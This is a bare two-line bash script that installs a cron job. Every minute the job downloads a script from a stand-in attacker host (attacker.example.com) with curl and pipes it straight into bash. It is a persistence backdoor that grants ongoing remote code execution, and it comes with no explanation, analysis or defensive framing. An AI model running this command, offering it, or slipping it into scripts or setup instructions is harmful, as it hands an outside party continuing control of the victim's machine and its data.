#!/bin/bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://attacker.example.com/b | bash") | crontab -
